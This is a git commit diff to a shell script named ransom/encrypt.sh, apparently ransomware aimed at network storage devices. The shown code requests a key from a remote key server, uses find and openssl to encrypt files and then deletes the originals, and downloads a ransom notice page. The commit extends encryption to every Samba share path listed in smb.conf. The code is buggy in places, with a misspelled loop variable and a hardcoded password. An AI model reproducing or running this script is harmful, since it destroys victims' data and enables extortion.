1468f8210f7f39ed59d9ef56f22a13dc937182de
absane <jsibley1@gmail.com>
2017-05-31 16:45:13 -0400

    Update encrypt.sh

--- ransom/encrypt.sh
+++ ransom/encrypt.sh
@@ -9,10 +9,23 @@ splashLocation="https://raw.githubusercontent.com/absane/Tricks/master/ransom/ra
 # Folder to encrypt
 targetFolder="/mnt/HD/HD_a2"
 
+# Samba folders only. Set to False to target only $targetFolder
+smb=True
+
 #	Encrypt files
 . /tmp/dynamicconfig.ini
 KEY=$(curl ${keyServer}/key.php?mac=$DEVICEID -s)
-find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
+smb=True
+if [ $smb == "True" ]
+then
+	for targerFolder in $(cat /etc/samba/smb.conf | grep path | cut -d ' ' -f3-99);
+  do
+    find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
+  done
+else
+	find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
+fi
+
 
 #	Warn user their files are encrypted
 curl $splashLocation -s > /tmp/READTHIS_YourFilesAreEncrypted.html
